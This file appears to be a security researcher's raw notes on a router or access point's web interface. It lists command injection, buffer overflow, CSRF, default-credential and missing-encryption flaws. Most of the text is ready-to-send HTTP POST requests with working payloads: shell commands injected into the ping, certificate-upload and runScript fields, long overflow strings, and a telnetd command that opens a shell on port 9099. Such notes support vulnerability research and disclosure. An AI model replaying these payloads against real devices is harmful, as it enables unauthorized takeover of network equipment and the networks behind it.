@@ -1,0 +1,229 @@
+1. Command injection in Ping command allowed after login with admin/root. Use the IE browser for this one. Also this is a blind injection when worked 
+
+	POST /forms/webSetPingTrace HTTP/1.1
+	Accept: text/html, application/xhtml+xml, image/jxr, */*
+	Referer: http://192.168.127.253/ping_trace.asp
+	Accept-Language: en-US
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 86
+	Host: 192.168.127.253
+	Pragma: no-cache
+	Cookie: Password508=e07f98b965bcc5abfe11c9c763b2d333
+	Connection: close
+
+	srvName=192.168.127.102;ping -c 8 192.168.127.101;##&option=0&bkpath=%2Fping_trace.asp
+	
+	
+	# Displays the output now (192.168.127.101;echo `ls -1 /usr/webs`#)
+	
+		POST /forms/webSetPingTrace HTTP/1.1
+		Accept: text/html, application/xhtml+xml, image/jxr, */*
+		Referer: http://192.168.127.253/ping_trace.asp
+		Accept-Language: en-US
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 72
+		Host: 192.168.127.253
+		Pragma: no-cache
+		Cookie: Password508=2204b322d9fe931fa9ef299987e9de47
+		Connection: close
+
+		srvName=192.168.127.101;echo `ls -l`##&option=0&bkpath=%2Fping_trace.asp
+		srvName=192.168.127.101;telnetd -l/bin/sh -p9099##&option=0&bkpath=%2Fping_trace.asp
+	
+	
+2. Open wireless, so anyone can connect and give himself an ip address in range 192.168.127.xxx and use 192.168.127.253 as gateway NEW FIREMWARE
+
+3. No HTTPOnly flag on Cookie NEW FIREMWARE
+
+4. No SSL on HTTP which means anyone can see the traffic and having open wireless makes it even worse 
+
+5. Default Telnet and SSH enabled with same creds admin/root by default 
+
+6. Config.ini can be downloaded clear text file 
+
+7. CSRF systemic 
+
+9. Possible Stack overflow in iw_system using 516 As and overflows at YYYY below  
+
+	POST /forms/webSetPingTrace HTTP/1.1
+	Accept: text/html, application/xhtml+xml, image/jxr, */*
+	Referer: http://192.168.127.253/ping_trace.asp
+	Accept-Language: en-US
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 622
+	Host: 192.168.127.253
+	Pragma: no-cache
+	Cookie: Password508=6d86219d9cca208c1085cce81fdd31f0
+	Connection: close
+
+	srvName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBLLLLZZZZXXXXYYYYKKKKCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEE&option=0&bkpath=%2Fping_trace.asp
+	
+10. Possible memory corruption mostly can be stack overflow in sending mail or DOS as BBBC goes in r3 for this one in core2 or core3 and you are stopped executing web_extract_params from [r3,something] so needs right address there to overflow the stack, but right now DOS 
+
+
+	POST /forms/web_SendTestEmail HTTP/1.1
+	Accept: */*
+	Content-type: application/x-www-form-urlencoded
+	Referer: http://192.168.127.253/email_server.asp
+	Accept-Language: en-us
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Host: 192.168.127.253
+	Content-Length: 752
+	Pragma: no-cache
+	Cookie: Password508=fab7f1d1efa604721aa70cf5a1ad163f
+	Connection: close
+
+	server=server.mail.com&username=test&password=test&from=test@mail.com&to1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDDEEEEFFFFXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+	
+11. Command injection in iw_certvalidate in iwlib by using pasword for certfiel wrong  
+
+	However CSRF_FI.html does not send cookies when sending the POST request with file contents.  and it sends only in FF and Chrome, Not in IE but still without cookies. 
+	
+	But an internal user can control the router after logging in to the router
+	
+	POST /forms/web_certUpload HTTP/1.1
+	Host: 192.168.127.253
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
+	Accept: */*
+	Accept-Language: en-US,en;q=0.5
+	Cookie: Password508=68abf30ef8176a4248320929e04df562
+	Content-Length: 899
+	Content-Type: multipart/form-data; boundary=---------------------------114782935826962
+	Origin: null
+	Connection: close
+
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="iw_privatePass"
+
+	;`ping -c 9 192.168.127.103` ##
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="bkpath"
+
+	/wireless_cert.asp?index=1
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="certSection"
+
+	certWlan
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="rfindex"
+
+	0
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="Submit"
+
+	Submit
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="certFile1"
+
+	test.txt
+	-----------------------------114782935826962
+	Content-Disposition: form-data; name="certFile"; filename="blob"
+	Content-Type: text/xml
+
+	<a id="a"><b id="b">hey!</b></a>
+	-----------------------------114782935826962--
+
+12. No authz on http://192.168.127.253//systemlog.log 
+
+13. Sprintf based BO in 0x00039518 web_runScript API call 
+
+	POST /forms/web_runScript HTTP/1.1
+	Accept: text/html, application/xhtml+xml, image/jxr, */*
+	Referer: http://192.168.127.253/Troubleshooting.asp
+	Accept-Language: en-US
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Content-Type: multipart/form-data; boundary=---------------------------7e21a62f2905ca
+	Content-Length: 718
+	Host: 192.168.127.253
+	Pragma: no-cache
+	Cookie: Password508=071b1093656adca3510d5e32f69737ec
+	Connection: close
+
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_filename"; filename="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC"
+	Content-Type: application/octet-stream
+
+	ls -ltr
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_storage"
+
+	tftp
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_serverip"
+
+	`ping -c 3 192.168.127.101`
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="bkpath"
+
+	/Troubleshooting.asp
+	-----------------------------7e21a62f2905ca--
+
+14. Memory corruption in web_runscript 
+
+	POST /forms/web_runScript HTTP/1.1
+	Accept: text/html, application/xhtml+xml, image/jxr, */*
+	Referer: http://192.168.127.253/Troubleshooting.asp
+	Accept-Language: en-US
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Content-Type: multipart/form-data; boundary=---------------------------7e21a62f2905ca
+	Content-Length: 1013
+	Host: 192.168.127.253
+	Pragma: no-cache
+	Cookie: Password508=c629f1b9d18c3d751da6d7b1fd43e628
+	Connection: close
+
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_filename"; filename="XXXX"
+	Content-Type: application/octet-stream
+
+	ls -ltr
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_storage"
+
+	tftp
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_serverip"
+
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIAAAAAAAAAAAABBBBCCCCDDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIAAAAAAAAAAAABBBBCCCCDDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIAAAAAAAAAAAABBBBCCCCDDDD
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="bkpath"
+
+	/Troubleshooting.asp
+	-----------------------------7e21a62f2905ca--
+	
+15. CMD INJ in web_runscript 
+
+	POST /forms/web_runScript HTTP/1.1
+	Accept: text/html, application/xhtml+xml, image/jxr, */*
+	Referer: http://192.168.127.253/Troubleshooting.asp
+	Accept-Language: en-US
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+	Content-Type: multipart/form-data; boundary=---------------------------7e21a62f2905ca
+	Content-Length: 560
+	Host: 192.168.127.253
+	Pragma: no-cache
+	Cookie: Password508=c598615e6217711824c76cb6f2360e49
+	Connection: close
+
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_filename"; filename="`ping -c 9 192.168.127.101`"
+	Content-Type: application/octet-stream
+
+	ls -ltr
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_storage"
+
+	tftp
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="iw_serverip"
+
+	1111
+	-----------------------------7e21a62f2905ca
+	Content-Disposition: form-data; name="bkpath"
+
+	/Troubleshooting.asp
+	-----------------------------7e21a62f2905ca--
+
